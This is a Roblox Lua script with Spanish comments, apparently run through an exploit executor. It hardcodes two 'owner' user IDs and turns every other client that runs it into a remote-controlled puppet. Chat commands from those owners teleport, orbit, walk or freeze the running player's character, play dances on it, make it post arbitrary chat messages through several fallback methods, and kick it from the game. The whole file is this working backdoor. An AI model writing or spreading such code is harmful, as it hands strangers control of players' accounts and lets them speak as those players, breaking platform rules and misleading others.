task.spawn(function()
    repeat task.wait() until game:IsLoaded()

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local HttpService = game:GetService("HttpService")
    local TextChatService = game:GetService("TextChatService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local StarterGui = game:GetService("StarterGui")
    local LocalPlayer = Players.LocalPlayer
    local ownerIds = {4591285210, 2275056290}

    local Orbiting, Walking, Frozen = false, false, false
    local danceTracks, frozenPositions, emotes = {}, {}, {}
    local lastCommandTime = 0
    local commandCooldown = 0.5

    pcall(function()
        local data = game:HttpGet("https://raw.githubusercontent.com/Joystickplays/AFEM/refs/heads/main/emotes.json")
        emotes = HttpService:JSONDecode(data)
    end)

    local function IsOwner(userId)
        for _, id in ipairs(ownerIds) do
            if userId == id then return true end
        end
        return false
    end

    local function GetOwnerPlayer()
        for _, id in ipairs(ownerIds) do
            local player = Players:GetPlayerByUserId(id)
            if player then return player end
        end
        return nil
    end

    local function GetTargetPlayer(name)
        if name then
            name = name:lower()
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():sub(1, #name) == name then
                    return p
                end
            end
        end
        return GetOwnerPlayer()
    end

    local function GetTargetPlayers(name)
        local targets = {}
        if name then
            name = name:lower()
            for _, p in ipairs(Players:GetPlayers()) do
                if not IsOwner(p.UserId) and p.Name:lower():sub(1, #name) == name then
                    table.insert(targets, p)
                end
            end
        else
            for _, p in ipairs(Players:GetPlayers()) do
                if not IsOwner(p.UserId) then
                    table.insert(targets, p)
                end
            end
        end
        return targets
    end

    local function StartAntiSeatLoop()
        task.spawn(function()
            while Orbiting or Walking do
                task.wait(0.2)
                local char = LocalPlayer.Character
                if char then
                    local hum = char:FindFirstChildWhichIsA("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hum and hum.Sit then hum.Sit = false end
                    if hrp and hrp:FindFirstChild("SeatPart") then hrp.SeatPart:Sit(nil) end
                end
            end
        end)
    end

    local function TeleportToPlayer(name)
        local target = GetTargetPlayer(name)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local pos = target.Character.HumanoidRootPart.Position
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0, 6, 0))
            end
        end
    end

    local function StopOrbit()
        Orbiting = false
        RunService:UnbindFromRenderStep("OrbitAroundTarget")
    end

    local function StartOrbit(name)
        if IsOwner(LocalPlayer.UserId) then return end
        StopOrbit()
        Orbiting = true
        StartAntiSeatLoop()
        local target = GetTargetPlayer(name)
        if not target then Orbiting = false return end

        RunService:BindToRenderStep("OrbitAroundTarget", Enum.RenderPriority.Character.Value, function()
            if not Orbiting then return end
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local t = tick()
                local radius = 10
                local speed = 2
                local x = math.cos(t * speed) * radius
                local z = math.sin(t * speed) * radius
                local targetPos = target.Character.HumanoidRootPart.Position
                local newPos = targetPos + Vector3.new(x, 3, z)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(newPos, targetPos)
            end
        end)
    end

    local function StopWalking()
        Walking = false
        RunService:UnbindFromRenderStep("WalkToTarget")
    end

    local function WalkToPlayer(name)
        if IsOwner(LocalPlayer.UserId) then return end
        StopWalking()
        Walking = true
        StartAntiSeatLoop()
        local target = GetTargetPlayer(name)
        if not target then Walking = false return end

        RunService:BindToRenderStep("WalkToTarget", Enum.RenderPriority.Character.Value, function()
            if not Walking then return end
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                humanoid:MoveTo(target.Character.HumanoidRootPart.Position)
            end
        end)
    end

    local function FreezeAll()
        if IsOwner(LocalPlayer.UserId) then return end -- Owner no se congela
        Frozen = true
        RunService:BindToRenderStep("FreezePlayers", Enum.RenderPriority.Camera.Value, function()
            if not Frozen then return end
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Anchored = true
            end
        end)
    end

    local function UnfreezeAll()
        if IsOwner(LocalPlayer.UserId) then return end -- Owner no se descongela
        Frozen = false
        RunService:UnbindFromRenderStep("FreezePlayers")
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Anchored = false
        end
    end

    local function DoRandomDance(player)
        if not player.Character then return end
        local hum = player.Character:FindFirstChildOfClass("Humanoid")
        if not hum or #emotes == 0 then return end

        local random = emotes[math.random(1, #emotes)]
        local rawId = tostring(random.animationid or "")
        local extractedId = rawId:match("id=(%d+)")

        if not extractedId then
            warn("No se pudo extraer el ID del link: " .. rawId)
            return
        end

        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://" .. extractedId
        local track = hum:LoadAnimation(anim)
        track.Looped = true
        track:Play()

        danceTracks[player] = danceTracks[player] or {}
        table.insert(danceTracks[player], track)
    end

    local function StopAllDancesOn(player)
        if danceTracks[player] then
            for _, track in ipairs(danceTracks[player]) do
                pcall(function() track:Stop() end)
            end
            danceTracks[player] = nil
        end
    end

    local function KickPlayer(p)
        p:Kick("You were kicked by the owner")
    end

    -- Sistema mejorado de envío de mensajes que funciona con cualquier chat
    local function SendChatMessage(message)
        local success = false
        
        -- Método 1: TextChatService (nuevo sistema de chat) - MÁS DIRECTO
        pcall(function()
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local textChannels = TextChatService.TextChannels
                if textChannels then
                    local generalChannel = textChannels.RBXGeneral
                    if generalChannel then
                        generalChannel:SendAsync(message)
                        success = true
                        return
                    end
                    -- Fallback para otros canales
                    for _, channel in pairs(textChannels:GetChildren()) do
                        if channel:IsA("TextChannel") then
                            channel:SendAsync(message)
                            success = true
                            break
                        end
                    end
                end
            end
        end)

        -- Método 2: Sistema de chat clásico (MÁS DIRECTO)
        if not success then
            pcall(function()
                local success2 = false
                -- Intento 1: ReplicatedStorage directo
                if ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
                    local chatEvents = ReplicatedStorage.DefaultChatSystemChatEvents
                    if chatEvents:FindFirstChild("SayMessageRequest") then
                        chatEvents.SayMessageRequest:FireServer(message, "All")
                        success2 = true
                    end
                end
                
                -- Intento 2: Buscar eventos alternativos
                if not success2 then
                    for _, child in pairs(ReplicatedStorage:GetChildren()) do
                        if child.Name:lower():find("chat") then
                            for _, subChild in pairs(child:GetChildren()) do
                                if subChild:IsA("RemoteEvent") and (subChild.Name:lower():find("say") or subChild.Name:lower():find("message")) then
                                    subChild:FireServer(message, "All")
                                    success2 = true
                                    break
                                end
                            end
                            if success2 then break end
                        end
                    end
                end
                success = success2
            end)
        end

        -- Método 3: Directo con game.Players.LocalPlayer (último recurso)
        if not success then
            pcall(function()
                -- Simular escribir en chat usando el método más básico
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    -- Crear burbuja temporal
                    game:GetService("Chat"):Chat(player.Character.Head, message, Enum.ChatColor.White)
                    success = true
                end
            end)
        end
        
        return success
    end

    -- Sistema mejorado de detección de comandos usando múltiples métodos
    local function SetupCommandDetection()
        local commandHandlers = {}
        
        -- Método 1: Evento Chatted tradicional
        local function setupChattedHandler(player)
            if IsOwner(player.UserId) then
                local connection
                connection = player.Chatted:Connect(function(message)
                    local currentTime = tick()
                    if currentTime - lastCommandTime < commandCooldown then return end
                    lastCommandTime = currentTime
                    
                    ProcessOwnerCommand(message)
                end)
                commandHandlers[player] = connection
            end
        end

        -- Método 2: TextChatService (nuevo sistema)
        local function setupTextChatHandler()
            pcall(function()
                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                    local textChannels = TextChatService:WaitForChild("TextChannels", 2)
                    if textChannels then
                        for _, channel in ipairs(textChannels:GetChildren()) do
                            if channel:IsA("TextChannel") then
                                channel.MessageReceived:Connect(function(textChatMessage)
                                    local player = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                                    if player and IsOwner(player.UserId) then
                                        local currentTime = tick()
                                        if currentTime - lastCommandTime < commandCooldown then return end
                                        lastCommandTime = currentTime
                                        
                                        ProcessOwnerCommand(textChatMessage.Text)
                                    end
                                end)
                            end
                        end
                    end
                end
            end)
        end

        -- Configurar métodos
        for _, player in ipairs(Players:GetPlayers()) do
            setupChattedHandler(player)
        end
        
        setupTextChatHandler()

        Players.PlayerAdded:Connect(setupChattedHandler)
        Players.PlayerRemoving:Connect(function(player)
            if commandHandlers[player] then
                commandHandlers[player]:Disconnect()
                commandHandlers[player] = nil
            end
        end)
    end

    function ProcessOwnerCommand(message)
        if message:sub(1,3) == "/e " then message = message:sub(4) end

        local args = {}
        for word in message:lower():gmatch("%S+") do table.insert(args, word) end
        local cmd = args[1]
        local arg = args[2]

        if cmd == ".t" then TeleportToPlayer(arg)
        elseif cmd == ".u" then StartOrbit(arg)
        elseif cmd == ".uu" then StopOrbit()
        elseif cmd == ".w" then WalkToPlayer(arg)
        elseif cmd == ".ww" then StopWalking()

        elseif cmd == ".q" then
            if not IsOwner(LocalPlayer.UserId) then
                -- Si hay un argumento (nombre), verificar si aplica a este jugador
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        FreezeAll()
                    end
                else
                    -- Sin argumento = congelar todos los seguidores
                    FreezeAll()
                end
            end

        elseif cmd == ".qq" then
            if not IsOwner(LocalPlayer.UserId) then
                -- Si hay un argumento (nombre), verificar si aplica a este jugador
                if arg then
                    local playerName = LocalPlayer.Name:lower()
                    if playerName:sub(1, #arg) == arg then
                        UnfreezeAll()
                    end
                else
                    -- Sin argumento = descongelar todos los seguidores
                    UnfreezeAll()
                end
            end
        
        elseif cmd == ".b" then
            if arg then
                for _, p in ipairs(GetTargetPlayers(arg)) do
                    if p:FindFirstChild("__JmodsConnected") then
                        DoRandomDance(p)
                    end
                end
            else
                for _, p in ipairs(Players:GetPlayers()) do
                    if not IsOwner(p.UserId) and p:FindFirstChild("__JmodsConnected") then
                        DoRandomDance(p)
                    end
                end
            end

        elseif cmd == ".bb" then
            if arg then
                for _, p in ipairs(GetTargetPlayers(arg)) do
                    if p:FindFirstChild("__JmodsConnected") then
                        StopAllDancesOn(p)
                    end
                end
            else
                for _, p in ipairs(Players:GetPlayers()) do
                    if not IsOwner(p.UserId) and p:FindFirstChild("__JmodsConnected") then
                        StopAllDancesOn(p)
                    end
                end
            end

        elseif cmd == ".k" then 
            for _, p in ipairs(GetTargetPlayers(arg)) do 
                KickPlayer(p) 
            end
            
        elseif cmd == ".m" then 
            if not IsOwner(LocalPlayer.UserId) and #args >= 2 then 
                local messageToSend = table.concat(args, " ", 2)
                SendChatMessage(messageToSend)
            end
        end
    end

    local function CheckAndConnectPlayers()
        for _, player in ipairs(Players:GetPlayers()) do
            if not player:FindFirstChild("__JmodsConnected") then
                local marker = Instance.new("BoolValue")
                marker.Name = "__JmodsConnected"
                marker.Parent = player
            end
        end
    end

    Players.PlayerAdded:Connect(function(player)
        task.wait(0.5)
        if IsOwner(player.UserId) then
            CheckAndConnectPlayers()
        end
    end)

    -- Inicializar sistema
    CheckAndConnectPlayers()
    SetupCommandDetection()

    print("Sistema de administración cargado correctamente")
    print("Comandos: /e .comando - Funciona con cualquier sistema de chat")
end)
